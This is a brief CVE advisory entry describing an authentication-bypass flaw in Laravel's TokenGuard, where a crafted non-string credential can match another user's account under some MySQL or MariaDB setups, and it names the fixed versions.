CVE-2026-114509.description: Laravel is a web application framework. Prior to 12.68.0 and 13.29.0, TokenGuard configured as a standard token-based API guard does not reject a crafted non-string credential. Under affected MySQL or MariaDB configurations, the authentication lookup can match an unintended existing user, allowing an unauthenticated attacker to bypass authentication and take over an account on routes protected by TokenGuard. This issue is fixed in versions 12.68.0 and 13.29.0.
